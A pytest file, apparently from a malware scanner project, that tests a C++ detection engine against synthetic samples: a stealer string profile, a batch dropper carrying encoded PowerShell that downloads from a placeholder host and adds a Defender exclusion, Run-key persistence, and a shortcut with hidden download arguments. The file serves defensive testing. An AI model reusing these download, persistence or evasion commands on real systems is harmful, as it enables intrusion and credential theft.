"""C++ evidence layer (gk::analysis): detections, locations, false positives and the JSON contract.

Every sample that looks malicious is generated here at runtime from harmless text fragments; nothing in
this file is executable and nothing is executed.
"""

from __future__ import annotations

import base64
import io
import os
import random
import shutil
import struct
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

from gamekernel.core.models import FileResult, RiskLevel

ROOT = Path(__file__).resolve().parents[2]
SEVEN_ZIP = shutil.which("7z") or shutil.which("7za")


@pytest.fixture(scope="module")
def rules(native):
    loaded = native.AnalysisRules.load([str(ROOT / "signatures" / "yara")],
                                       str(ROOT / "signatures" / "internal" / "indicators.yar"))
    assert loaded.detection_report["ok"] and loaded.indicator_report["ok"]
    return loaded


def _analyze(native, rules, data: bytes, name: str, **kw) -> dict:
    out = native.analyze_bytes(data, name, rules=rules, **kw)
    # Contract: every document produced by C++ loads into the Python model unchanged.
    for doc in [out["result"], *out["members"]]:
        assert FileResult.from_dict(doc).to_dict() == doc
    return out


def _ids(doc: dict) -> set[str]:
    return {e["rule_id"] for e in doc["evidences"]}


def _ev(doc: dict, rule_id: str) -> dict:
    return next(e for e in doc["evidences"] if e["rule_id"] == rule_id)


# ----------------------------------------------------------------------------------- detections

def test_stealer_profile_with_locations(native, rules):
    data = (b"MZ" + b"\0" * 64 + b"Google\\Chrome\\User Data\\Default\\Login Data\0encrypted_key\0CryptUnprotectData\0"
            + "discord\\Local Storage\\leveldb".encode("utf-16-le") + b"\0wallet.dat\0"
            + b"https://discord.com/api/webhooks/123456789012/xyz\0 45.13.22.9:7777 ")
    doc = _analyze(native, rules, data, "crack_fix.exe")["result"]
    ids = _ids(doc)
    assert {"YARA.GK_Stealer_Multi_Target", "HEUR.Stealer.BrowserPasswords", "HEUR.Stealer.Profile",
            "HEUR.Network.Webhook", "HEUR.Network.HardcodedEndpoint", "HEUR.Combined.MalwareCapabilities"} <= ids
    webhook = _ev(doc, "HEUR.Network.Webhook")
    assert webhook["severity"] == "HIGH" and webhook["fp_note"]
    loc = webhook["locations"][0]
    assert data[loc["offset"]:loc["offset"] + loc["length"]].decode().startswith("discord.com/api/webhooks/")
    wide = [l for e in doc["evidences"] for l in e["locations"] if "leveldb" in l.get("excerpt", "")]
    assert wide and data[wide[0]["offset"]:wide[0]["offset"] + 4] == "di".encode("utf-16-le")


def test_batch_dropper_with_encoded_powershell(native, rules):
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://x/a'); Add-MpPreference -ExclusionPath C:\\"
    enc = base64.b64encode(ps.encode("utf-16-le")).decode()
    bat = (f"@echo off\r\nrem setup\r\npowershell -nop -w hidden -enc {enc}\r\n"
           "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d x.exe\r\n").encode()
    doc = _analyze(native, rules, bat, "install_crack.bat")["result"]
    ids = _ids(doc)
    assert {"SCRIPT.EncodedPowerShell", "HEUR.DefenseEvasion.Defender", "HEUR.Downloader.ScriptOrLolbin",
            "HEUR.Persistence.Autostart"} <= ids
    decoded = _ev(doc, "SCRIPT.EncodedPowerShell")
    assert decoded["locations"][0]["line"] == 3 and "DownloadString" in decoded["details"]["decodificado"]
    autostart = _ev(doc, "HEUR.Persistence.Autostart")
    assert autostart["locations"][0]["line"] == 4


def test_base64_embedded_executable_in_powershell(native, rules):
    blob = base64.b64encode(b"MZ" + bytes(range(256)) * 2).decode()
    script = f"$b=[Convert]::FromBase64String('{blob}')\n[IO.File]::WriteAllBytes($env:TEMP+'\\a.exe',$b)\n"
    doc = _analyze(native, rules, script.encode(), "patch.ps1")["result"]
    assert "SCRIPT.EmbeddedExecutable" in _ids(doc)
    assert _ev(doc, "SCRIPT.EmbeddedExecutable")["severity"] == "HIGH"


def test_obfuscated_script(native, rules):
    script = "$x=" + "+".join(f"[char]{ord(c)}" for c in "Write-Host ola mundo de teste") + "\n"
    doc = _analyze(native, rules, script.encode(), "run.ps1")["result"]
    assert "SCRIPT.Obfuscated" in _ids(doc)


def test_eicar_detected_by_rule(native, rules):
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*").encode()
    doc = _analyze(native, rules, eicar, "eicar.com")["result"]
    e = _ev(doc, "YARA.GK_Test_EICAR")
    assert e["source"] == "yara" and e["category"] == "test_file" and "verdict:test" in e["tags"]


# ----------------------------------------------------------------------------------- names and types

def _pe_header(size=1024) -> bytes:
    buf = bytearray(size)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x8664, 0, 0, 0, 0, 0xF0, 0x0022)
    struct.pack_into("<H", buf, 0x98, 0x20B)
    struct.pack_into("<H", buf, 0x98 + 68, 3)
    return bytes(buf)


@pytest.mark.parametrize("name, rule", [
    ("svchost.exe", "NAME.SystemProcessName"),
    ("scvhost.exe", "NAME.Typosquat"),
    ("Leia-me.pdf.exe", "NAME.DoubleExtension"),
    ("manual\u202efdp.exe", "NAME.RightToLeftOverride"),
])
def test_name_deception(native, rules, name, rule):
    assert rule in _ids(_analyze(native, rules, _pe_header(), name)["result"])


def test_benign_names_are_not_flagged(native, rules):
    for name in ("Game.exe", "readme.txt", "Setup.exe", "patch_notes.pdf", "explorer.ini"):
        ids = _ids(_analyze(native, rules, _pe_header() if name.endswith(".exe") else b"texto", name)["result"])
        assert not {i for i in ids if i.startswith("NAME.")}, (name, ids)


def test_disguised_executable(native, rules):
    doc = _analyze(native, rules, _pe_header(), "textures_01.pak")["result"]
    assert "FILE.DisguisedExecutable" in _ids(doc)


# ----------------------------------------------------------------------------------- network literals

def test_network_literals(native):
    data = (b"conecta 10.0.0.5:8080 e 45.13.22.9:7777; versao 1.2.3.4; local 127.0.0.1:80 0.0.0.0:53 "
            b"999.1.1.1:80 1.2.3.4:999999 8.8.8.8:53x" + "203.0.113.7:4444".encode("utf-16-le"))
    found = native.network_literals(data)
    assert "10.0.0.5:8080" in found and "45.13.22.9:7777" in found and "203.0.113.7:4444" in found
    for absent in ("127.0.0.1:80", "0.0.0.0:53", "1.2.3.4:999999"):
        assert absent not in found
    assert not any(f.startswith("999.") for f in found)


# ----------------------------------------------------------------------------------- shortcuts

def _lnk(target: str, args: str, icon: str = "") -> bytes:
    flags = 0x08 | 0x20 | 0x80 | (0x40 if icon else 0)  # relative path, arguments, unicode, icon
    header = bytearray(76)
    struct.pack_into("<I", header, 0, 0x4C)
    header[4:20] = bytes.fromhex("0114020000000000c000000000000046")
    struct.pack_into("<I", header, 0x14, flags)

    def s(text: str) -> bytes:
        return struct.pack("<H", len(text)) + text.encode("utf-16-le")

    body = s(target) + s(args) + (s(icon) if icon else b"")
    return bytes(header) + body


def test_lnk_runs_hidden_command(native, rules):
    args = " " * 120 + "/c powershell -w hidden -c \"iwr http://x/p.exe -OutFile $env:TEMP\\p.exe\""
    data = _lnk("..\\..\\Windows\\System32\\cmd.exe", args, "%SystemRoot%\\System32\\shell32.dll")
    parsed = native.parse_lnk(data)
    assert parsed["valid"] and parsed["target"].endswith("cmd.exe") and parsed["arguments"] == args
    ids = _ids(_analyze(native, rules, data, "Jogar.lnk")["result"])
    assert {"LNK.RunsCommand", "LNK.HiddenArguments", "LNK.IconDisguise"} <= ids


# ----------------------------------------------------------------------------------- archives

def _zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in entries.items():
            z.writestr(name, data)
    return buf.getvalue()


def test_archive_members_are_analysed_individually(native, rules):
    inner = _zip({"svchost.exe": _pe_header(), "notes.txt": b"ok"})
    outer = _zip({"Game/run.bat": b"@echo off\r\nattrib +h +s x.exe\r\n", "../../evil.dll": b"MZ", "extras.zip": inner})
    out = _analyze(native, rules, outer, "Game_Repack.zip")
    assert not _ids(out["result"])  # the container repeats nothing: members carry their own findings
    by_path = {m["path"]: m for m in out["members"]}
    assert "HEUR.Stealth.Hidden" in _ids(by_path["Game_Repack.zip::Game/run.bat"])
    assert "ARCHIVE.PathTraversal" in _ids(by_path["Game_Repack.zip::../../evil.dll"])
    nested = by_path["Game_Repack.zip::extras.zip::svchost.exe"]
    assert "NAME.SystemProcessName" in _ids(nested)
    assert nested["container"] == "Game_Repack.zip" and nested["member_path"] == "extras.zip::svchost.exe"
    assert nested["depth"] == 2


def test_quick_mode_does_not_expand_archives(native, rules):
    doc = _analyze(native, rules, _zip({"a.txt": b"x"}), "a.zip", deep=False)
    assert doc["members"] == [] and doc["result"]["status"] == "partial"
    assert any("modo rápido" in r for r in doc["result"]["status_reasons"])


@pytest.mark.skipif(SEVEN_ZIP is None, reason="7-Zip não disponível para gerar a amostra")
def test_encrypted_members_are_reported(native, rules, tmp_path):
    src = tmp_path / "crack.dll"
    src.write_bytes(_pe_header())
    target = tmp_path / "enc.zip"
    subprocess.run([SEVEN_ZIP, "a", "-bd", "-tzip", "-psenha", str(target), str(src)], check=True, capture_output=True)
    out = _analyze(native, rules, target.read_bytes(), "enc.zip")
    assert "ARCHIVE.Encrypted" in _ids(out["result"])
    skipped = [m for m in out["members"] if m["status"] == "skipped"]
    assert skipped and skipped[0]["name"] == "crack.dll" and "senha" in skipped[0]["status_reasons"][0]


def test_bomb_reported_on_container(native, rules):
    bomb = _zip({"zeros.bin": b"\0" * (48 << 20)})
    out = native.analyze_bytes(bomb, "bomb.zip", rules=rules, limits={"max_total_bytes": 8 << 20})
    assert out["result"]["status"] == "partial"


# ----------------------------------------------------------------------------------- false positives

def test_benign_pe_corpus_stays_low(native, rules, tmp_path):
    sys.path.insert(0, str(ROOT / "tests" / "corpus_pe"))
    import build_corpus

    if not build_corpus.available():
        pytest.skip("mingw-w64 indisponível")
    for path in build_corpus.build(tmp_path / "corpus"):
        out = _analyze(native, rules, path.read_bytes(), path.name)
        worst = max((RiskLevel[e["severity"]] for e in out["result"]["evidences"]), default=RiskLevel.NONE)
        assert worst <= RiskLevel.LOW, (path.name, [(e["rule_id"], e["severity"]) for e in out["result"]["evidences"]])


def test_size_limit_marks_partial(native, rules):
    out = native.analyze_bytes(_pe_header(4096), "big.exe", rules=rules, limits={"max_analysis_bytes": 1024})
    assert out["result"]["status"] == "partial"


def test_analysis_fuzzing(native, rules):
    rng = random.Random(int(os.environ.get("GK_FUZZ_SEED", "7")))
    seeds = [_pe_header(), _zip({"a.bat": b"@echo off\r\nreg add x"}), b"@echo off\r\npowershell -enc AAAA",
             _lnk("cmd.exe", "/c echo")]
    for _ in range(int(os.environ.get("GK_FUZZ_ITERATIONS", "200"))):
        sample = bytearray(rng.choice(seeds))
        for _ in range(rng.randint(1, 10)):
            if sample:
                sample[rng.randrange(len(sample))] = rng.randrange(256)
        native.analyze_bytes(bytes(sample), rng.choice(["x.exe", "y.zip", "z.bat", "w.lnk", "v.bin"]), rules=rules)
